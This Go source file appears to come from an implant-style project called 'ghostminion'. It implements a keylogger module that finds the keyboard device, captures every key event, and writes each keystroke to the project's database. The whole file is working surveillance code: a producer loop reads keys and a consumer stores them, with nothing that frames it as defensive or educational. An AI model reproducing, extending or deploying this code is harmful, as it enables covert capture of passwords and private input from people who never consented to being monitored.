package apps

import (
	"context"
	"ghostminion/db"
	"ghostminion/db/dbDataTypes"
	"github.com/MarinX/keylogger"
)

type KeyLoggerApp struct {
	baseApp   *BaseApp
	eventChan chan string
}

func NewKeyLoggerApp(appData AppData) (*KeyLoggerApp, error) {
	return &KeyLoggerApp{
		baseApp: &BaseApp{
			stop:    make(chan struct{}, 1),
			AppData: &appData,
		},
		eventChan: make(chan string, 100), // buffered to decouple producer/consumer
	}, nil
}

func (k *KeyLoggerApp) Name() string {
	return k.baseApp.Name
}

// Start runs producer/consumer until ctx is canceled
func (k *KeyLoggerApp) Start(ctx context.Context) error {
	// find keyboard device
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) == 0 {
		lgr.Warn("No keyboard found, you may need to provide manual input path")
		return nil
	}
	lgr.Debug("Found keyboard at path: ", keyboard)

	kl, err := keylogger.New(keyboard)
	if err != nil {
		lgr.Error("Error creating keylogger instance: " + err.Error())
		return err
	}
	defer kl.Close()

	// run consumer in goroutine
	done := make(chan struct{})
	go func() {
		defer close(done)
		k.store(ctx)
	}()

	// run producer in this goroutine (blocking)
	k.produce(ctx, kl)

	<-done
	return nil
}

// Stop closes channels for cleanup
func (k *KeyLoggerApp) Stop() error {
	close(k.eventChan)
	return nil
}

// Producer reads events from keylogger and sends them into eventChan
func (k *KeyLoggerApp) produce(ctx context.Context, kl *keylogger.KeyLogger) {
	events := kl.Read()
	for {
		select {
		case <-ctx.Done():
			return
		case e := <-events:
			if e.Type == keylogger.EvKey {
				select {
				case k.eventChan <- e.KeyString(): // block if channel full
				case <-ctx.Done():
					return
				}
			}
		}
	}
}

// Consumer reads from eventChan and writes to DB
func (k *KeyLoggerApp) store(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		case key, ok := <-k.eventChan:
			if !ok {
				return
			}
			if err := db.GetInstance().WriteData("", dbDataTypes.Keyloggers, []byte(key)); err != nil {
				lgr.Error("Error writing keylogger data: " + err.Error())
			}
		}
	}
}

// validateParams placeholder
func (k *KeyLoggerApp) validateParams() error {
	return nil
}
